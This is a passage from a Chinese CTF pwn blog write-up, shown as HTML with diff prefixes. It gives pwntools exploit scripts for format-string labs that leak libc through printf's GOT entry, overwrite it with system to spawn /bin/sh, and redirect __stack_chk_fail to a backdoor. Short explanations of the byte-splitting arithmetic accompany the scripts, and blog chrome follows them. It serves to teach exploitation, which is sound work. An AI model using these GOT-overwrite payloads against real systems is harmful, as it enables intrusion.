class="string">'c%10$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sh.send(<span class="string">"King"</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	data = sh.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"King"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#检验输入完成！</span></span><br><span class="line"><span class="comment">#ebp1 --&gt; ebp2 --&gt; fmt11,取fmt11的低位两个字节，高位是ffff不变</span></span><br><span class="line">payload = <span class="string">"%"</span> + str(fmt11 &amp; <span class="number">0x0000ffff</span>) + <span class="string">'c%6$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">#ebp2 --&gt; fmt11 --&gt; printf_got+2</span></span><br><span class="line">payload = <span class="string">"%"</span> + str((printf_got+<span class="number">2</span>) &amp; <span class="number">0x0000ffff</span>) + <span class="string">'c%10$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sh.send(<span class="string">"King"</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	data = sh.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"King"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#检验输入完成！</span></span><br><span class="line"><span class="comment">#泄露got表地址</span></span><br><span class="line">log.info(<span class="string">"******leaking the print_got_add*********"</span>)</span><br><span class="line">payload = <span class="string">'aaaa%7$s'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">printf_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">"print_got_add is:[%s]"</span>%hex(printf_addr))</span><br><span class="line">system_addr = printf_addr - printf_libc + system_libc</span><br><span class="line">log.info(<span class="string">"system_add is:[%s]"</span>%hex(system_addr))</span><br><span class="line"><span class="comment">#fmt7--&gt;printf_got--&gt;systemd低２位</span></span><br><span class="line">payload = <span class="string">"%"</span> + str(system_addr &amp; <span class="number">0x0000ffff</span>) + <span class="string">'c%7$hn'</span></span><br><span class="line"><span class="comment">#fmt11--&gt;printf_got + 2--&gt;system高２位</span></span><br><span class="line">payload += <span class="string">"%"</span> + str((system_addr&gt;&gt;<span class="number">16</span>) - (system_addr &amp; <span class="number">0x0000ffff</span>)) + <span class="string">'c%11$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sh.send(<span class="string">"King"</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	data = sh.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"King"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#检验输入完成！</span></span><br><span class="line">sh.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-255564b0644dc27a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-6211fd59d06fc12b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-5ebea4c38969e167.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-b09bb922aa92f755.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-aa320ca5b556a814.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-34a9232ef033e519.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-913f7063e2ccabfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里积累下：</p>
+<p>1、地址 &amp; 0xffff是为了获取低位两个字节</p>
+<p>2、地址&gt;&gt;16 &amp;0xffff 是为了获取高位两个字节</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-5f2d83c590b3ade5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这里是因为%A$n是按照累加去计数的，所以要减去之前的，才是正确的计算。还有那个while True循环，是为了确认字符全部写入，因为一次只能接受0x1000个字符，所以相当于设置了一个标志位，确保能输入完成，最后检验一波~</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-46feda0da336a62b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里最关键的是通过动态调试一步一步地去看内容，单纯地看代码看不出来的，下断点，疯狂调试，很好玩~</p>
+<p>这里再来看看一道题，直接破坏canary触发stack_check_fail函数，我们在此将system函数的地址改写到stack_check_fail的plt表即可，也是一种利用思路，对于只有一次输入的情况适用。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-5f3794cf6b9dd44b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-e7197a74cb0019de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>后门函数就是hello，这里直接搞一波，即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line">p = process(<span class="string">'./babyfmt'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">system_addr = <span class="number">0x0400626</span></span><br><span class="line">stack_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">5</span> + <span class="string">'%'</span> + str(system_addr &amp; <span class="number">0xffff</span> - <span class="number">5</span>) + <span class="string">'c%8$hn'</span> + p64(stack_fail) + <span class="string">'a'</span>*<span class="number">100</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400675')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">64 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">61 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前置知识："><span class="toc-number">1.</span> <span class="toc-text">前置知识：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习题：LAB7："><span class="toc-number">2.</span> <span class="toc-text">练习题：LAB7：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习题LAB8"><span class="toc-number">3.</span> <span class="toc-text">练习题LAB8:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#练习题LAB9："><span class="toc-number">4.</span> <span class="toc-text">练习题LAB9：</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
